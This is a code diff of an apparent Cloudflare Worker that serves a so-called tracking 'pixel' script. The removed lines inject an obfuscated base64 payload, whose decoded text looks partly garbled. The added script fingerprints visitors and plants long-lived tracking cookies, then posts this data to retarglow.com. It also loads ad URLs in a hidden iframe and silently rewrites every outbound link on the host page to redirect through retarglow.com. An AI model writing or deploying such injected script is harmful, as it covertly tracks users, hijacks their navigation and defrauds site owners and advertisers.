@@ -1,22 +1,13 @@
 export default {
-  async fetch(request) {
+  async fetch(request, env, ctx) {
     const headers = {
       "Content-Type": "application/javascript",
       "Access-Control-Allow-Origin": "*"
     };
 
-    const base64 = `KGZ1bmN0aW9uKCl7dHJ5e2NvbnN0IGNpZD0iZGVmYXVsdC1jYW1wYWlnbjsiO2NvbnN0IGNvbXBldGl0b3JzPVsib3Jkb3plbi5jb20iLCJmbG9hdGJvb2xlYW4uY29tIiwic21jdC5jbyIsInNtY3QuaW8iXTtjb25zdCBkb21haW49bG9jYXRpb24uaG9zdG5hbWU7ZnVuY3Rpb24gZyhrKXtyZXR1cm4gZGVjb2RlVVJJQ29tcG9uZW50KChkb2N1bWVudC5jb29raWV8fCIiKS5zcGxpdCgnOyAnKS5maW5kKHIgPT4gci5zdGFydHNXaXRoKGsrJz0nKSk/LnNwbGl0KCc9JylbMV18fCcnKTtmdW5jdGlvbiBzKGssdixkKXtsZXQgZT1uZXcgRGF0ZSgpO2Uuc2V0VGltZShlLmdldFRpbWUoKSsxKjg2NGU1KTtkb2N1bWVudC5jb29raWU9aysnPScrZW5jb2RlVVJJKHZbKV0rJzsgcGF0aD0vOyBtYXgtYWdlPScrKGQqODY0MDApKyI7IFNhbWVTaXRlPUxheCc7In1sZXQgX3I9bG9jYWxTdG9yYWdlLmdldEl0ZW0oJ19yJyl8fGcoJ19yJyk7aWYoIV9yKXtffHI9Y3J5cHRvLnJhbmRvbVVVSUQoKTtsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgnX3InLF9yKTtzKCdfcicsX3IsMzApO31lbHNle2xvY2FsU3RvcmFnZS5zZXRJdGVtKCdfcicsX3IpO3MoJ19yJyxfcjszMCk7fWRvY3VtZW50LmNvb2tpZT0idXNlcl9pZF90PSIrX3IrIjsgcGF0aD0vOyBtYXgtYWdlPTMxNTM2MDA7IFNhbWVTaXRlPUxheCI7ZG9jdW1lbnQuY29va2llPSJzbWNfdWlkPSIrX3IrIjsgcGF0aD0vOyBtYXgtYWdlPTMxNTM2MDA7IFNhbWVTaXRlPUxheCI7Y29uc3QgYXQ9ImF0dHJpYnV0ZWQiK2NpZDtjb25zdCBzZW50PU1hdGgucm91bmQobmV3IERhdGUoKS5nZXRUaW1lKC8xMDAwKSk7Y29uc3QgbGFzdD1wYXJzZUludChsb2NhbFN0b3JhZ2UuZ2V0SXRlbShhdCkgb3wgIjAiKTtpZihzZW50LWxhc3QgPCAzKXtyZXR1cm59bG9jYWxTdG9yYWdlLnNldEl0ZW0oYXQsc2VudC50b1N0cmluZygpKTtjb25zdCBkPXtjYW1wYWlnbjpjb2RlQ1VSTShjaWQpLHUsdTp3aW5kb3cubG9jYXRpb24uaHJlZixyOnRvY2hlYW4uZGVzY3JpcHRpb24sY21fe3J9fTt3aW5kb3cuZmV0Y2goImh0dHBzOi8vcmV0YXJnbG93LmNvbS9sb2ciLHttZXRob2Q6IlBPU1QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeShkKX0pO3dpbmRvdy5mZXRjaCgiaHR0cHM6Ly9yZXRhcmdsb3cuY29tL3NlcnZlIix7bWV0aG9kOiJQT1NUIixoZWFkZXJzOnsiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24vanNvbiJ9LGJvZHk6SlNPTi5zdHJpbmdpZnkodHt1OncuZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5ocmVmKSxjbTpjbX19KSkudGhlbihyPT5yLmpzb24oKSkuY2F0Y2goKCk9Pnt9KTt9Y2F0Y2goZSl7fX0pKCk=`;
+    const pixelScript = `(function(){try{const c="default",u=location.href,r=document.referrer,n=navigator.userAgent,d=/Mobi|Android/i.test(n)?"M":"D",b=n.includes("Chrome")?"C":n.includes("Firefox")?"F":n.includes("Safari")?"S":"U",o=navigator.platform,s=screen.width+"x"+screen.height,_r=localStorage.getItem("_r")||crypto.randomUUID();localStorage.setItem("_r",_r);document.cookie="_r="+_r+";path=/;max-age=2592000;SameSite=Lax";document.cookie="smc_uid="+_r+";path=/;max-age=31536000;SameSite=Lax";const once=sessionStorage.getItem("i_"+c);const payload={cid:c,u,r,ua:n,dt:d,b,os:o,sr:s,cm:{_r},domain:location.hostname};fetch("https://retarglow.com/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});fetch("https://retarglow.com/serve",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u,cm:{_r}})}).then(r=>r.json()).then(j=>{if(j.ad_url&&!once){const f=document.createElement("iframe");f.style.display="none";f.referrerPolicy="no-referrer";f.src=j.ad_url.replace("{{_r}}",_r);document.body.appendChild(f);sessionStorage.setItem("i_"+c,"1");}});function hijackLinks(){document.querySelectorAll('a[href^="http"]').forEach(l=>{const h=l.getAttribute("href");if(h&&!h.includes("retarglow.com/r")){l.setAttribute("href","https://retarglow.com/r?id="+_r+"&t="+encodeURIComponent(h))}});}hijackLinks();new MutationObserver(hijackLinks).observe(document.body,{childList:1,subtree:1});}catch(e){}})();`;
 
-    const responseScript = `
-(function(){
-  const code = atob("${base64}");
-  const script = document.createElement("script");
-  script.type = "text/javascript";
-  script.textContent = code;
-  document.head.appendChild(script);
-})();`;
-
-    return new Response(responseScript, {
+    return new Response(pixelScript, {
       status: 200,
       headers
     });
